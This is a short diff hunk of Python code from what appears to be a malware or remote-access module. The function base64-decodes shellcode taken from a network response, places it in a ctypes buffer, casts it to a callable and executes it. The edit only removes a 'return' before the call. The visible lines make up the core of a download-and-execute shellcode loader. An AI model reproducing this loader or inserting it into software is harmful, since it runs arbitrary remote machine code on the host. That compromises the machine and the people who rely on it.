@@ -9,6 +9,6 @@ def run(** args):
 	shellcode = base64.b64decode(response.read())
 	shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))
 	shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))
-	return shellcode_func()
+	shellcode_func()
 	
 
